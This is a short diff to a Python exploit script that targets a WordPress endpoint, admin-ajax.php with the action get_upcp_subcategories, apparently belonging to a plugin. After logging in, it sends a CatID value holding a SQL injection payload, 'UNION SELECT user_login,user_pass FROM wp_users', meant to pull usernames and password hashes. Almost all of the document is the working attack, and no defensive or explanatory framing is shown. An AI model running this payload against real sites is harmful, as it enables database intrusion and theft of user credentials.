@@ -6,9 +6,10 @@ import SQLInj
 
 def attack(url):
     performLogin(url)
+    attackUrl = url + "/wp-admin/admin-ajax.php?action=get_upcp_subcategories"
     headers = {'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost'}
     data = {"CatID": "0 UNION SELECT user_login,user_pass FROM wp_users WHERE ID>=1"}
-    SQLInj.attack(url,LoginManager.session,headers,data)
+    SQLInj.attack(attackUrl,LoginManager.session,headers,data)
 
 
 def performLogin(url):
